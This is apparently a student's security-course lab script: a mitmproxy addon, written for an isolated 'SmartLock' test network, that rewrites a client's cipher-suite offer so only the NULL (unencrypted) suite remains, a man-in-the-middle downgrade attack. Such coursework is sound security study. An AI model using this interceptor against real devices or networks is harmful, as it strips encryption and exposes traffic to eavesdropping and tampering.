# Zohaib Umer | 23i-0528 | CS3002 Assignment 2 | Part A1
# Used with mitmproxy in the isolated SmartLock Option A network.
from mitmproxy import tcp
import logging

original = b"suites:AES256-GCM,AES128-GCM,NULL"
modified = b"suites:NULL"

def tcp_message(flow: tcp.TCPFlow):
    msg = flow.messages[-1]

    if msg.from_client and original in msg.content:
        msg.content = msg.content.replace(original, modified, 1)
        logging.warning("A1: Changed HELLO offer to NULL")

